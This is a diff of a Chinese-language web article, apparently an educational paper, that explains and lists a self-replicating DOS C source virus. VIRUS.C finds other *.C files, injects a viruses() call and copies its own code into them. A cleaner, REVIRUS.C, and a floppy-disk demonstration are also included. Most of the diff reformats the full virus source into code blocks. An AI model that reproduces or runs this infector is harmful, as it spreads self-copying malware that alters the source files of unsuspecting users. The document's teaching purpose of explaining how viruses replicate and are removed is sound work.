@@ -268,9 +268,11 @@ sub,sup{
 <p>然后定义保存未感染的文件和病毒文件的文件型指针变量，分别用是*virus_r和*virus_v.读取文件的缓冲区，放到二维数组a[500][80]里面临时存放。因为此程序对大于500行的C文件不进行传染，所以完全可以放到里面。首先用getdate函数获取系统当前日期并输出。接着用findfirst函数查找扩展名为C的文件，将其信息保存到ffblk里面。用fgets函数读文件的第一行，长度是80-1个字符。然后用strstr函数检测病毒的标志，看文件是否有INFECT这个标志。</p>
 <p>如果有，表示文件已经被传染，关闭文件，不进行传染。当含有病毒部分的程序被执行时，首先进入病毒程序。它在磁盘上查找*.C的匹配文件，一旦找到，查找“已被传染过”的标志INFECTED。若有此标志，继续找其它*.C文件，直至全部检查一遍。</p>
 <p>如果没有这个标志，将文件全部读入a[500][80]，如果发现文件超过500行，不传染，返回。将文件指针指向文件头，打开带病毒的文件。如果打不开，返回。</p>
-<p>然后读取带病毒文件的前4行，也就是病毒子程序要用到的头文件，写入将被传染的文件。若不能读取带病毒文件，返回。用n_line变量控制行数，把将被传染文件的源程序写回原文件。其中要进行处理不写入病毒文件已有的包含语句，也就是说使＃Include语句不重复。</p>
-<p>这点是这样实现的：定义一个字符数组char include_h[]={“dos.h”, “stdio.h”, “dir.h”}; strstr函数查看将被传染文件的头文件是否和*include_h[]相同，如果相同，不进行插入。找出CALL VIRUSES；的插入点：如果有一行有printf、break、for、while语句其中之一，就对其后插入调用VIRUSES函数的调用语句。把病毒子程序写入文件。最后处理更改被感染的文件名。如果不进行改名，就不能进行多次传染，也就是说不能体现病毒的自我复制能力。查找一行是static char viruses_f[]={“virus.c”}，把其中的文件名改为被感染的文件名。接着查找下一个匹配文件。</p>
-<p>3.1.2病毒清除程序REVIURS.C</p>
+<p>然后读取带病毒文件的前4行，也就是病毒子程序要用到的头文件，写入将被传染的文件。若不能读取带病毒文件，返回。用n_line变量控制行数，把将被传染文件的源程序写回原文件。其中要进行处理不写入病毒文件已有的包含语句，也就是说使＃include语句不重复。</p>
+
+<p>这点是这样实现的：定义一个字符数组char include_h[]={"dos.h","stdio.h","dir.h"}; strstr函数查看将被传染文件的头文件是否和*include_h[]相同，如果相同，不进行插入。找出CALL VIRUSES；的插入点：如果有一行有printf、break、for、while语句其中之一，就对其后插入调用VIRUSES函数的调用语句。把病毒子程序写入文件。最后处理更改被感染的文件名。如果不进行改名，就不能进行多次传染，也就是说不能体现病毒的自我复制能力。查找一行是static char viruses_f[]={“virus.c”}，把其中的文件名改为被感染的文件名。接着查找下一个匹配文件。</p>
+
+<p>3.1.2 病毒清除程序REVIURS.C</p>
 <p>病毒的清除过程是和传染过程相逆的。传染的时候插入调用viruses函数的调用语句，在病毒清除文件里面就要删除掉这个语句。然后还要删除掉病毒子程序VIURSES_SUB和VIURSES。有一个问题不能进行还原。因为当时插入病毒子程序需要的头文件时没有记录传染前文件的头文件信息，所以不能进行还原。但是这一点不影响原文件。所以这点在病毒清除程序中没有进行处理。</p>
 <p>由于演示的时候病毒程序VIRUS.C和清除病毒程序REVIURS.C放在同一个目录下进行演示。考虑到VIRUS.C会把REVIURS.C传染和REVIRUS.C会把VIRUS.C清除两种情况。所以编写这两个程序的时候必须加入一条条件语句if(strcmp(ffblk.ff_name,"REVIRUS.C")!=0)和if(strcmp(ffblk.ff_name,"VIRUS.C")!=0)。</p>
 <p>当含有清除部分的程序被执行时。它在磁盘上找扩展名为C的匹配文件，如果找到，查找是否有被传染过的标志“INFECTED”。如果无此标志，继续找其它的C文件，直至全部检查一遍。若有这个标志，则</p>
@@ -286,21 +288,33 @@ sub,sup{
 <p>3.3其中用到的函数和结构体的说明：</p>
 <p>（1）结构体struct ffblk （在dir.h中）类型变量</p>
 <p>变量ffblk用于打开文件，获取返回值。</p>
-<p>Struct ffblk</p>
-<p>{char ff_reserved[21];</p>
-<p>char ff_attrib;</p>
-<p>unsigned ff_ftime;</p>
-<p>unsigned ff_fdate;</p>
-<p>long ff_fize;</p>
-<p>char ff_name[13];</p>
-<p>};</p>
+<p></p>
+
+<pre>
+Struct ffblk
+{
+    char     ff_reserved[21];
+    char     ff_attrib;
+    unsigned ff_ftime;
+    unsigned ff_fdate;
+    long     ff_fize;
+    char     ff_name[13];
+};
+</pre>
+
 <p>程序中只用到ff_name来保存匹配文件名。</p>
 <p>（2）结构体struct date（在dos.h中）变量</p>
-<p>  struct date</p>
-<p>{int da_year;      /* Year-1980 */</p>
-<p>char da_day;     /* Day of the month */</p>
-<p>char da_mon;    /* Month (1=Jan) */</p>
-<p>};</p>
+<p></p>
+
+<pre>
+struct date
+{
+    int  da_year;      /* Year-1980 */
+    char da_day;       /* Day of the month */
+    char da_mon;       /* Month (1=Jan) */
+};e
+</pre>
+
 <p>程序中用来获取系统当前日期。具体用法为：</p>
 <p>void getdate (struct date *datep);</p>
 <p>（3）查找匹配文件</p>
@@ -311,10 +325,15 @@ sub,sup{
 <p>        Findnext继续检索。</p>
 <p>  返回值：0（检索成功），-1（没有找到指定的文件）</p>
 <p>  属性常数：</p>
-<p>  FA_NORMAL(0*00)   含意：Normal file， no attributes</p>
-<p>  FA_RDONLY (0*01)   含意：只读</p>
-<p>  FA_HIDDEN(0*02)    含意：隐含文件</p>
-<p>  FA_SYSTEM(0*24)    含意：系统文件</p>
+<p></p>
+
+<pre>
+  FA_NORMAL(0*00)    含意：Normal file， no attributes
+  FA_RDONLY (0*01)   含意：只读
+  FA_HIDDEN(0*02)    含意：隐含文件
+  FA_SYSTEM(0*24)    含意：系统文件
+</pre>
+
 <p>  需要用到的头文件： dir.h</p>
 <p>程序中的匹配文件属于普通文件，所以属性常数为0。</p>
 <p>（4）读文件</p>
@@ -338,6 +357,8 @@ sub,sup{
 <p>由于读取文件的时候文件指针要发生变化。而重新执行一条命令的时候需要重新定位文件指针的位置，所以要用到fseek函数。程序中用这个函数定位到文件头，对文件进行重新读取。</p>
 <p>3.4 程序清单</p>
 <p>3.4.1病毒程序VIRUS.C程序清单如下：</p>
+<p></p>
+
 <pre>
 /*INFECTED*/
 #include "stdio.h"
@@ -345,216 +366,226 @@ sub,sup{
 #include "dir.h"
 main()
 {
-  viruses();
+    viruses();
 }
 int viruses_sub()
 {
-   struct ffblk ffblk;
-   int done,i,j,k,n_line;
-   FILE *virus_r,*virus_v;
-/*virus_r指向将被感染的文件，virus_v指向已带病毒的文件*/
-   char a[500][80],b[80],*p1,*p2; /*将被传染的文件读入a[500][80]临时存放*/
-   static char viruses_f[]={"virus.c"};/*文件被传染后，修改该值为自身文件名*/
-   int include_write;
-   int virus_call=0;
-   int virus_start=0;
-   char *main_flag[]={"printf","break","for","while"};
-   char *include_h[]={"dos.h","stdio.h","dir.h"};
-   char *v_flag[]={"INFECTED"};
-   struct date today;
-/*VIRUSES DISPLAY*/
-   getdate(&today); /*病毒显示日期信息*/
-   printf("Today is %d/%d/%d\n",today.da_mon,today.da_day,today.da_year);
-/*AFFECT VIRUSES*/
-   done=findfirst("*.c",&ffblk,0); /*查找第一个匹配文件*/
-   while(!done)
-   {
-       if(strcmp(ffblk.ff_name,"REVIRUS.C")!=0)
-       {
-          virus_r=fopen(ffblk.ff_name,"r+w");
-          if(virus_r!=NULL)
-          {
-             p1=fgets(&a[0][0],80,virus_r);
-             if(strstr(p1,v_flag[0])==NULL)
-             {
-                n_line=0; /*把文件全部读入a[500][80]*/
-                while(p1!=NULL)
-               {
-                   n_line++;
-                   p1=fgets(&a[n_line][0],80,virus_r);
-                   if(n_line>=500)
-                   {
-                       fclose(virus_r);
-                       return(1);
-                   }
-               }
-               fseek(virus_r,0,SEEK_SET);
-               virus_v=fopen(&viruses_f[0],"r"); /*打开带病毒的文件*/
-               if(virus_v==NULL)
-               {
-                   fclose(virus_r);
-                   return(2);
-               }
-              for(i=1;i&lt;5;i++) /*读带病毒文件前4行并写入将被传染的文件*/
-             {
-             p2=fgets(b,80,virus_v);
-             if(p2==NULL)
+    struct ffblk ffblk;
+    int done,i,j,k,n_line;
+    FILE *virus_r,*virus_v;
+                                         /*virus_r指向将被感染的文件，virus_v指向已带病毒的文件*/
+    char a[500][80],b[80],*p1,*p2;       /*将被传染的文件读入a[500][80]临时存放*/
+    static char viruses_f[]={"virus.c"}; /*文件被传染后，修改该值为自身文件名*/
+    int include_write;
+    int virus_call=0;
+    int virus_start=0;
+    char *main_flag[]={"printf","break","for","while"};
+    char *include_h[]={"dos.h","stdio.h","dir.h"};
+    char *v_flag[]={"INFECTED"};
+    struct date today;
+                                     /*VIRUSES DISPLAY*/
+    getdate(&today);                 /*病毒显示日期信息*/
+    printf("Today is %d/%d/%d\n",today.da_mon,today.da_day,today.da_year);
+                                     /*AFFECT VIRUSES*/
+    done=findfirst("*.c",&ffblk,0);  /*查找第一个匹配文件*/
+    while(!done)
+    {
+        if(strcmp(ffblk.ff_name,"REVIRUS.C")!=0)
+        {
+            virus_r=fopen(ffblk.ff_name,"r+w");
+            if(virus_r!=NULL)
             {
+                p1=fgets(&a[0][0],80,virus_r);
+                if(strstr(p1,v_flag[0])==NULL)
+                {
+                    n_line=0;                       /*把文件全部读入a[500][80]*/
+                    while(p1!=NULL)
+                    {
+                        n_line++;
+                        p1=fgets(&a[n_line][0],80,virus_r);
+                        if(n_line>=500)
+                        {
+                            fclose(virus_r);
+                            return(1);
+                        }
+                    }
+                    fseek(virus_r,0,SEEK_SET);
+                    virus_v=fopen(&viruses_f[0],"r"); /*打开带病毒的文件*/
+                    if(virus_v==NULL)
+                    {
+                        fclose(virus_r);
+                        return(2);
+                    }
+                    for(i=1;i&lt;5;i++)                  /*读带病毒文件前4行并写入将被传染的文件*/
+                    {
+                        p2=fgets(b,80,virus_v);
+                        if(p2==NULL)
+                        {
+                            fclose(virus_r);
+                            fclose(virus_v);
+                            return(3);
+                        }
+                        fputs(b,virus_r);
+                    }
+                    for(j=0;j&lt;n_line;j++)   /*把将被传染文件的原程序写回原文件*/
+                    {
+                        include_write=1;    /*不写入病毒文件已有的包含语句*/
+                        if(strstr(&a[j][0],"#include")!=NULL)
+                            for(i=0;i&lt;3;i++)
+                                if(strstr(&a[j][0],include_h[i])!=NULL)
+                                    include_write=-1;
+                        if(virus_call==0)   /*插入调用语句，并加上回车换行*/
+                            for(i=0;i&lt;4;i++)
+                                if(strstr(&a[j][0],main_flag[i])!=NULL)
+                                {
+                                    for(k=0;k&lt;80;k++)
+                                        b[k]=0;
+                                    strcpy(&b[0],"viruses();");
+                                    b[10]=13;
+                                    b[11]=10;
+                                    fputs(b,virus_r);virus_call=1;
+                                    i=4;
+                                }
+                         if(include_write==1)fputs(&a[j][0],virus_r);
+                    }
+                    p1=fgets(b,80,virus_v);  /*把病毒子程序写入文件*/
+                    while(p1!=NULL)
+                    {
+                        if(virus_start==0)    /*找病毒子程序的第一条语句*/
+                            if(strstr(p1,"int viruses_sub()")!=NULL)
+                                virus_start=1;
+                            if(virus_start==1)
+                            {
+                                if(strstr(p1,"char")!=NULL)
+                                    if(strstr(p1,"viruses_f[]=")!=NULL)
+                                    {
+                                        strcpy(&b[29],ffblk.ff_name);
+                                        i=strlen(&b[0]);
+                                        b[i]=34;
+                                        strcpy(&b[i+1],");");
+                                        b[i+3]=13;
+                                        b[i+4]=10;
+                                    }
+                                    fputs(b,virus_r);
+                            }
+                            p1=fgets(b,80,virus_v);
+                    }
+                    fclose(virus_v);
+                    fclose(virus_r);
+                    return(0);
+                }
                 fclose(virus_r);
-                fclose(virus_v);
-                return(3);
             }
-            fputs(b,virus_r);
-         }
-         for(j=0;j&lt;n_line;j++) /*把将被传染文件的原程序写回原文件*/
-         {
-            include_write=1; /*不写入病毒文件已有的包含语句*/
-           if(strstr(&a[j][0],"#include")!=NULL)
-           for(i=0;i&lt;3;i++)
-           if(strstr(&a[j][0],include_h[i])!=NULL)
-               include_write=-1;
-           if(virus_call==0)   /*插入调用语句，并加上回车换行*/
-              for(i=0;i&lt;4;i++)
-              if(strstr(&a[j][0],main_flag[i])!=NULL)
-              {
-                  for(k=0;k&lt;80;k++)
-                     b[k]=0;
-                  strcpy(&b[0],"viruses();");
-                  b[10]=13;
-                  b[11]=10;
-                  fputs(b,virus_r);virus_call=1;
-                  i=4;
-              }
-             if(include_write==1)fputs(&a[j][0],virus_r);
-         }
-         p1=fgets(b,80,virus_v);  /*把病毒子程序写入文件*/
-         while(p1!=NULL)
-         {
-            if(virus_start==0)  /*找病毒子程序的第一条语句*/
-              if(strstr(p1,"int viruses_sub()")!=NULL)
-                  virus_start=1;
-              if(virus_start==1)
-              {
-                  if(strstr(p1,"char")!=NULL)
-                      if(strstr(p1,"viruses_f[]=")!=NULL)
-                      {
-                          strcpy(&b[29],ffblk.ff_name);
-                          i=strlen(&b[0]);
-                          b[i]=34;
-                          strcpy(&b[i+1],");");
-                         b[i+3]=13;
-                         b[i+4]=10;
-                      }
-                fputs(b,virus_r);
-             }
-             p1=fgets(b,80,virus_v);
-         }
-      fclose(virus_v);
-      fclose(virus_r);
-      return(0);
-   }
-   fclose(virus_r);
-  }
-}
-   done=findnext(&ffblk);
-}
+        }
+        done=findnext(&ffblk);
+    }
     return(4);
 }
 viruses()
+{
+    int num;
+    num=viruses_sub();
+    switch (num)
     {
-      int num;
-      num=viruses_sub();
-      switch (num)
-      {
-             case  0 : printf("successful\n");
-                       break;
-             case  1: printf("the file is outof line\n");
-                       break;
-             case  2 : printf("the viruses file cannot open\n");
-                       break;
-             case  3 : printf("cannot read viruses file\n");
-                       break;
-             case  4: printf("cannot find file\n");
-      }
-getch();
+    case  0 : printf("successful\n");
+        break;
+    case  1: printf("the file is outof line\n");
+        break;
+    case  2 : printf("the viruses file cannot open\n");
+        break;
+    case  3 : printf("cannot read viruses file\n");
+        break;
+    case  4: printf("cannot find file\n");
+    }
+    getch();
 }
 </pre>
+
 <p>3.4.2病毒清除程序REVIURS.C清单如下：</p>
+<p></p>
+
 <pre>
 #include "stdio.h"
 #include "dos.h"
 #include "dir.h"
 main()
 {
-  struct ffblk ffblk;
-  int done,i,j,line,k;
-  static int n_line;
-  FILE *virus_r,*virus_v;
-  char a[500][80],b[80],*p;
-  char *v_flag[]={"INFECTED"};
-  done=findfirst("*.c",&ffblk,0);
-  while(!done)
-  {
-    if(strcmp(ffblk.ff_name,"VIRUS.C")!=0)
+    struct ffblk ffblk;
+    int done,i,j,line,k;
+    static int n_line;
+    FILE *virus_r,*virus_v;
+    char a[500][80],b[80],*p;
+    char *v_flag[]={"INFECTED"};
+    done=findfirst("*.c",&ffblk,0);
+    while(!done)
     {
-    for(k=0;k&lt;500;k++)
-    for(j=0;j&lt;80;j++)
-       a[k][j]=0;
-      virus_r=fopen(ffblk.ff_name,"r+w");
-      if(virus_r!=NULL)
-     {
-      p=fgets(&b[0],80,virus_r);
-     if(strstr(p,v_flag[0])!=NULL)
-      {
-         line=0;
-        while(p!=NULL)
+        if(strcmp(ffblk.ff_name,"VIRUS.C")!=0)
         {
-      p=fgets(&b[0],80,virus_r);
-      if(strstr(&b[0],"int viruses_sub()")!=NULL)
-           break;
-       else if(strstr(&b[0],"viruses();")==NULL)
+            for(k=0;k&lt;500;k++)
+                for(j=0;j&lt;80;j++)
+                    a[k][j]=0;
+            virus_r=fopen(ffblk.ff_name,"r+w");
+            if(virus_r!=NULL)
             {
-              k=strlen(b);
-            for(j=0;j&lt;k;j++)
-            a[line][j]=b[j];
-            a[line][j+1]=0;
-            line++;
-           }
-       }
-    n_line=line;
-    fclose(virus_r);
-    remove(ffblk.ff_name); /*删除文件*/
-    virus_r=fopen(ffblk.ff_name,"w+");  /*打开将被感染的文件*/
-        for(i=0;i&lt;n_line;i++)
-        {
-          fputs(&a[i][0],virus_r); /*把二维数组中的数据写入原文件*/
-        }
-          fclose(virus_r);
-    }
+                p=fgets(&b[0],80,virus_r);
+                if(strstr(p,v_flag[0])!=NULL)
+                {
+                    line=0;
+                    while(p!=NULL)
+                    {
+                        p=fgets(&b[0],80,virus_r);
+                        if(strstr(&b[0],"int viruses_sub()")!=NULL)
+                            break;
+                        else if(strstr(&b[0],"viruses();")==NULL)
+                        {
+                            k=strlen(b);
+                            for(j=0;j&lt;k;j++)
+                                a[line][j]=b[j];
+                            a[line][j+1]=0;
+                            line++;
+                        }
+                    }
+                    n_line=line;
+                    fclose(virus_r);
+                    remove(ffblk.ff_name);             /*删除文件*/
+                    virus_r=fopen(ffblk.ff_name,"w+"); /*打开将被感染的文件*/
+                    for(i=0;i&lt;n_line;i++)
+                    {
+                        fputs(&a[i][0],virus_r);       /*把二维数组中的数据写入原文件*/
+                    }
+                    fclose(virus_r);
+                }
             }
-           }
-      done=findnext(&ffblk); /*查找下一个匹配文件*/
-      }
+        }
+        done=findnext(&ffblk);                         /*查找下一个匹配文件*/
+    }
 }
 </pre>
+
 <p>4. 计算机病毒的演示</p>
 <p>4.1病毒程序VIRUS.C的演示过程</p>
 <p>在一张已经格式化的软盘上，除了病毒源程序VIRUS.C和REVIRUS.C外，还有两个尚未被感染的C语言程序TEST1.C和TEST2.C。原始代码分别如下：</p>
-<p>TEST1.C：</p>
-<p>#include "stdio.h"</p>
-<p>main()</p>
-<p>{</p>
-<p>int i,sum;</p>
-<p>for(i=1;i<100;i++)</p>
-<p>sum=sum+i;</p>
-<p>printf("sum=%d\n",sum);</p>
-<p>}</p>
-<p>TEST2.C</p>
-<p>#include "stdio.h"</p>
-<p>main()</p>
-<p>{</p>
-<p>printf("hello,world!\n");</p>
-<p>}</p>
+<p></p>
+
+<pre>
+//TEST1.C：
+#include "stdio.h"
+main()
+{
+    int i,sum;
+    for(i=1;i&lt;100;i++)
+        sum=sum+i;
+    printf("sum=%d\n",sum);
+}
+//TEST2.C
+#include "stdio.h"
+main()
+{
+    printf("hello,world!\n");
+}
+
+</pre>
+
 <p>在命令提示符下键入dir命令查看文件信息。</p>
 <p>然后编译连接并执行VIRUS.C文件，运行结果显示：</p>
 <p>Today is 5/20/2004</p>
